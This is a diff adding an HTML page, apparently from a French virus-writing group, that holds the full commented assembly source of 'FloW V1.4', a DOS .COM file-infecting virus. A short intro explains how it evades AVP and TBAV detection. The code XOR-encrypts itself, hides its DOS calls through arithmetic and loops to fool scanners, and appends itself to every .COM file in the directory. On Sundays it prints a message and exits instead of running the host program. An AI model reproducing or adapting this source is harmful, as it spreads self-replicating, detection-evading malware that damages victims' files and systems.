@@ -1,0 +1,320 @@
+<html>
+<head>
+<title>FloW - DIE BITCH</title>
+</head>
+<body bgcolor=#000000>
+<center>
+</font>
+<pre>
+<font size=2 color=#ffff00>
+******************************************************************************
+{{{{{{{{{{{{{{{{{{{{{{{{{{{  Mon petit FloW  }}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+******************************************************************************
+</center> </font> </pre> <font size=3 color=#ffffff>
+<br>
+
+Bon bah là on se cache d'AVP. après pas mal d'essai on comprend comment AVP
+cherche les virus. Une chose qu'il recherche avant tout est la routine de
+recherche des fichiers. Le findfirst et le findnext. On pense que c'est simple
+à détourner mais pour arriver à appeler l'interruption rien n'y fait, AVP détecte
+tout, même si vous faites de SHL des IMULS etc... Mais bon en réfléchissant bien
+on trouve la solution. Regardez donc le source et vous verrez, une petite boucle
+qui incrémente suffit :). Au fait Thunderbyte anti-virus est nikel pour savoir
+pourquoi votre virus est détecté :)
+
+<font size=3 color=#FF0000>
+<pre>
+
+
+;¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
+;
+;VDS PROJECT par TiPiaX
+;Passe a travers les anti-virus TBAV et AVP
+;
+;¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
+
+CODE    SEGMENT                                                          
+        ASSUME CS:CODE,DS:CODE                                                    
+
+ORG 100H  
+
+debut:
+
+   db 0e9h,0,0               ;on ecrie ça pour que le prog reconnaisse 
+                             ;qu'il est deja infecte
+                             ;car sinon il va s'auto-infecter
+
+
+virus:
+        call virus_start     ;call pour pouvoir recuperer l'adresse
+
+        db 090h,090h,090h,090h  ;4 nop pour tromper AV-Toolkit pro (pas de E80000)
+
+virus_start:
+
+   pop bp                    ;qu'on recupere
+   lea cx,[virus_start-4]    ;soustrait les 4 nops       
+   sub bp,cx                 ;et on adapte a nos besoins
+
+;------------------------------------------------------------------------
+  
+  cmp [bp+cryptverif],0      ;le fichier est crypte ?
+  je restaurebits            ;oui ! on le decrypte ;non ! on saute
+
+  decrypt:
+
+       mov al, [bp+key]                 ;cle de cryptage/decryptage dans al
+       lea bx, [bp+restaurebits]        ;bx pointe sur la partie cryptée
+       mov cx, (virus_end-restaurebits) ;taille du decryptage
+  
+  boucle:
+       xor byte ptr [bx], al  ;le XOR
+       inc bx                 ;bx = bx+1
+       loop boucle            ;boucle tant que cx !=0
+
+;------------------------------------------------------------------------
+
+restaurebits:
+
+   mov cx,3                  ;remet les 3 bits originaux
+   mov di,100h               ;depart du com
+   lea si,[bp+buffer]        ;endroit où on a copié les 3 bits
+   rep movsb                 ;on le fait tant que cx!=0
+
+dta:
+
+   lea  dx,[bp+mydta]        ;adresse de mydta
+   mov  ah,10h               ;1ah Set DTA
+   add  ah,0ah
+   int  21h                  ;
+
+CHECK_DAY:
+
+   mov ah,20h
+   add ah,0Ah      ; ah,2Ah   ;Get Date = on trompe TBAV :)
+
+   int 21h         ;
+   cmp al,0        ;Dimanche ou pas ?
+   jne pasgreve    ;si non, on fait pas la greve
+                   ;sinon on continue
+
+;greve
+
+   lea dx,[bp+message]   ;message !
+   push ax
+   mov ax,0900h
+   int 21h
+   pop ax
+   mov ah,4ch      ;retour au dos
+   int 21h 
+
+
+pasgreve:
+
+   mov byte ptr[bp+fichiercom+3], 'O'   ;on ne le fait que dans un sens car ensuite
+                                        ;le virus est crypté
+
+   mov cx,4Eh
+   xor ah,ah
+revient:
+   inc ah
+   dec cx
+   cmp cx, 0         ;mov ah,4Eh   =  on trompe AVP :)
+   jne revient       ;putain AVP - il m'a fait chier la dessus
+
+   lea dx,[bp+fichiercom]   ;findfirst
+   mov cx,21h
+   int 21h                   ;
+
+OUVERTURE:
+
+   jc finbis                 ;si on trouve pas on quitte
+
+   mov ax,3CFFh              ;mov ax,3D02h = ouverture-du-fichier
+   add ax,0003h              ;(le 02 indique lecture-ecriture)
+   lea dx,[bp+mydta+1eh]    ;nom dans DTA_PLACE+1eh
+   int 21h
+
+   mov bx,ax                 ;handle en bx
+
+
+CHECK_INFECTION:             ;ça c'est du code barbare !
+
+   mov ah,30h                ;3fh  lecture du 1er bit
+   add ah,0fh
+   mov cx,1                  ;on en lit 1
+   lea dx,[bp+verification]  ;le bit dans verification
+   int 21h                   ;
+
+
+   cmp [bp+verification], 0e9h ;compare le 1er bit a 0e9h
+   jz FERMETUREBIS             ;si = on cherche un autre
+
+INFECTION:
+
+   mov ax, 41F0h             ;4200 pointeur du fichier au debut
+   add ax, 10h
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah,30h
+   add ah,0fh                ;3Fh  lecture des premiers bits
+   mov cx,3                  ;on en lit 3
+   lea dx,[bp+buffer]        ;les 3 bits dans buffer
+   int 21h                   ;
+
+
+   mov ax, 41F2h             ;4202 pointeur du fichier a la fin
+   add ax, 10h
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;                       
+   
+   jmp codagedujmp
+
+;relais-------------------
+
+        FERMETUREBIS:
+        jmp FERMETURE
+
+        finbis:                   ;relais pour le jmp de debut pointant vers la fin
+        jmp fin                   ;se soit pas "out of range"
+
+        OUVERTUREBIS:             ;relais pour que le jmp a la fin
+        jmp OUVERTURE             ;puisse se faire
+
+;fin du relais-----------
+
+
+   codagedujmp:
+
+   sub ax,3
+   mov word ptr [bp+buffer2+1],ax     ;codage du jump
+
+;ecriture du jmp
+
+   mov ax, 41F0h             ;4200 pointeur du fichier au debut
+   add ax, 10h
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+
+   mov ah, 30h
+   add ah, 10h               ;40h  écriture du jmp
+   mov cx, 3                 ;on écrit 3 bits
+   lea dx,[bp+buffer2]       ;pointe sur le jmp codé
+   int 21h                   ;
+
+
+cryptage:
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+   mov [bp+cryptverif],1      ;Flag indiquant que le fichier le virus sera crypté
+
+   lea si, [bp+restaurebits]  ;transfere la partie du virus
+   lea di, [bp+cryptbuffer]   ;a copier dans le buffer + les variables non cryptés
+   mov cx, virus_fin-restaurebits  ;taille du transfert
+   rep movsb                  ;on transfere tant que cx!=0
+
+
+   crypt:
+
+   mov al, [bp+key]            ;clé en al
+   lea si, [bp+cryptbuffer]    ;si pointe sur le buffer de cryptage
+   mov cx, (virus_end-restaurebits)  ;taille de seulement ce qu'il faut crypter
+  
+   myboucle:
+       xor byte ptr [si], al   ;le XOR
+       inc si                  ;incrémente
+       loop myboucle           ;on boucle tant que cx!=0
+
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+;infusion
+
+   mov ax, 41F2h             ;4202 pointeur du fichier a la fin
+   add ax, 10h
+   xor cx, cx                ;
+   xor dx, dx                ;
+   int 21h                   ;
+
+   mov ah,30h
+   add ah,10h                ;40h  copie le debut du virus
+   mov cx, restaurebits-virus ;
+   lea dx, [bp+virus]        ;
+   int 21h                   ;
+
+   mov ah,30h
+   add ah,10h                ;40h  ecriture de la fin du virus
+   mov cx, virus_fin-restaurebits ;en partie cryptée
+   lea dx,[bp+cryptbuffer]   ;
+   int 21h
+
+
+FERMETURE:
+
+   mov ah,30h
+   add ah,0Eh                ; 3Eh fermeture-du-fichier
+   int 21h
+
+   mov ah,30h
+   add ah,1Fh                ;mov ah,4Fh = findnext : Anti-AVP :)
+   int 21h                   ;si y en a pas on se casse
+   jmp OUVERTUREBIS          ;si y en a on revient
+
+
+fin:
+
+;execution-du-prog-victime
+
+fin_cherche:
+   mov  dx,10h
+   add  dx,70h          ;80h replacement de la dta
+   mov  ah,10h
+   add  ah,0ah          ;ah = 1ah
+   int  21h
+
+   mov di,0FEh
+   inc di
+   inc di     ;di pointe a 100h (depart des coms)
+   push di    ;le virus passe la main au prog infecte
+   ret
+
+
+;============================================================================
+
+variables:
+
+   buffer db 3 dup (?)       ;buffer des 3 bits
+   fichiercom db '*.C¤M',0   ;cible: les coms
+   buffer2 db 0e9h,?,?       ;buffer du jmp de depart
+   verification db ?         ;sert pour tester si le fichier est deja infecté
+   message db 'Je suis votre ordinateur, il est dimanche je refuse donc de travailler !','$'
+   TiPiaX db 'FloW V1.4 - TiPiaX/VDS'
+
+virus_end:
+
+   cryptverif db 0           ;teste si le fichier est crypté ou non
+   key db 23h                ;clé de cryptage
+
+virus_fin:
+
+   cryptbuffer db virus_fin-restaurebits dup (?) ; buffer pour cryptage
+   mydta db 42 dup (?)       ;on le met la car on ne veut pas copier le contenu
+                             ;de la DTA
+CODE ENDS
+END debut
+
+</font></pre>
+
+
+<font size=3 color=#ffff00><br><br>
+<center>
+<pre>TiPiaX/VDS</pre>
+<br>
+</font></body></html>
+
